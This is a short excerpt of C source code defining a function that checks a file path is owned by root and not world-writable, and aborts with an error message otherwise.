    73	static void validate_path_has_strict_perms(const char *path) {
    74	    struct stat stat_buf;
    75	    if (stat(path, &stat_buf) < 0) {
    76	        die("cannot stat %s", path);
    77	    }
    78	
    79	    errno = 0;
    80	    if (stat_buf.st_uid != 0 || stat_buf.st_gid != 0) {
    81	        die("%s not root-owned %i:%i", path, stat_buf.st_uid, stat_buf.st_gid);
    82	    }
    83	
    84	    if (stat_buf.st_mode & S_IWOTH) {
    85	        die("%s has 'other' write %o", path, stat_buf.st_mode);
    86	    }
    87	}
